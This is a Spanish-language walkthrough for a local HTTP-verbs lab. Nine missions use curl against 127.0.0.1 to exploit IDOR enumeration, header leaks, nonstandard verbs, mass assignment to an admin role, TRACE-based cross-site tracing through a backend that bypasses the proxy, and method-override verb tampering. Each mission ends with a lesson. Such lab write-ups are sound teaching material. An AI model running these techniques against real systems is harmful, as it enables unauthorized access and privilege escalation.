# Write-up · Local Tech Lab :: HTTP Verbs

> **SPOILERS.** Intenta cada misión antes de leer. `BASE=http://127.0.0.1:8080`

## M1 · GET — Intern's Notes
`GET /api/m1/notes` lista las notas 1–3 y avisa que no todas están listadas. Enumera IDs:

```bash
for id in 1 2 3 4 100 1337; do printf "%s -> " $id; curl -s -o /dev/null -w "%{http_code}\n" "$BASE/api/m1/notes?id=$id"; done
curl -s "$BASE/api/m1/notes?id=1337"
```
La nota 1337 contiene la flag y las credenciales del operador. La nota 2 menciona un listener de diagnóstico en `:9000`.
**Lección:** ocultar un recurso del listado no es control de acceso (IDOR).

## M2 · HEAD — Silent Vault
```bash
curl -sI $BASE/api/m2/vault      # flag en X-LTL-Flag
```
**Lección:** HEAD devuelve las mismas cabeceras que GET sin cuerpo; aquí el servidor filtra datos solo en HEAD. Revisa siempre las cabeceras.

## M3 · OPTIONS — Gatekeeper
```bash
curl -si -X OPTIONS $BASE/api/m3/gate   # Allow: GET, HEAD, OPTIONS, LTLSCAN
curl -s  -X LTLSCAN $BASE/api/m3/gate
```
**Lección:** `Allow` describe la superficie de ataque. Los servidores pueden aceptar verbos no estándar.

## M4 · POST — Operator Login
```bash
curl -s -X POST $BASE/api/m4/login -H "Content-Type: application/json" \
     -d '{"user":"operator","pass":"L0cal-T3ch!2026"}'
export TOKEN=ltl-...
```
Sin `Content-Type: application/json` → `415`. Con GET → `405`.

## M5 · PUT — Compliance Upload
```bash
curl -si -X PUT $BASE/api/m5/files/ltl-check.txt --data-binary "LOCAL TECH LAB - compliance OK"   # 201 + flag
curl -si -X PUT $BASE/api/m5/files/ltl-check.txt --data-binary "LOCAL TECH LAB - compliance OK"   # 200
```
**Lección:** PUT apunta a la URI final del recurso y es idempotente. PUT sin nombre → `400`.

## M6 · PATCH — Partial Promotion
```bash
curl -s -X PATCH $BASE/api/m6/profile -H "X-LTL-Token: $TOKEN" \
     -H "Content-Type: application/merge-patch+json" -d '{"role":"admin"}'
```
**Lección:** *mass assignment*. El servidor acepta el campo `role` del cliente.

## M7 · DELETE — Ghost Session
```bash
curl -s $BASE/api/m7/sessions -H "X-LTL-Token: $TOKEN"
curl -s -X DELETE $BASE/api/m7/sessions/s-ghost -H "X-LTL-Token: $TOKEN"
```
Borrar tu propia sesión (`s-1001`) → `409`.

## M8 · TRACE — Proxy Whispers
```bash
curl -si -X TRACE $BASE/api/m8/echo            # 405: nginx rechaza TRACE siempre
curl -si -X TRACE http://127.0.0.1:9000/api/m8/echo
```
El listener de diagnóstico no pasa por nginx. Un middleware interno añade `X-LTL-Internal-Auth` a la petición y TRACE la refleja completa.
**Lección:** XST + backend accesible sin pasar por el proxy. Una defensa en el borde no sirve si se puede rodear.

## M9 · Verb tampering — Edge Bypass
```bash
curl -si -X DELETE $BASE/api/m9/records/42                                   # 403 (nginx limit_except)
curl -s  -X POST   $BASE/api/m9/records/42 -H "X-HTTP-Method-Override: DELETE"
```
**Lección:** el proxy filtra por el verbo real, pero la app ejecuta el verbo de la cabecera. Política en una capa, interpretación en otra.
